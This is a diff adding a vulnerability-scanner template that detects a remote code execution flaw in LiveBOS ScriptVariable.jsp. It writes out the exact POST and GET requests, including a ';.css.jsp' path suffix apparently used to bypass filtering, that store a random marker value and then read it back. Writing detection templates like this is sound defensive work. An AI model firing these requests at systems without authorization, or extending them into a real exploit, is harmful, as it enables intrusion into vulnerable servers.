@@ -1,0 +1,44 @@
+id: livebos-scriptvariable-jsp-rce
+info:
+  name: LiveBOS ScriptVariable.jsp Remote Code Execution
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: rce
+  description: |
+    This template checks for remote code execution vulnerability in LiveBOS ScriptVariable.jsp.
+
+variables:
+  t1: "{{md5(rand_int(100, 10000))}}"
+
+flow: http(1) && http(2)
+
+http:
+  - id: check-vuln
+    method: POST
+    path:
+      - "{{BaseURL}}/plug-in/common/ScriptVariable.jsp;.css.jsp"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: "act=put&scope=0&name=gName13&value={{t1}}"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "<result>true</result>"
+
+  - id: verify-exploitation
+    method: GET
+    path:
+      - "{{BaseURL}}/plug-in/common/ScriptVariable.jsp;.css.jsp?act=get&scope=0&name=gName13"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "{{t1}}"
+          - "true"
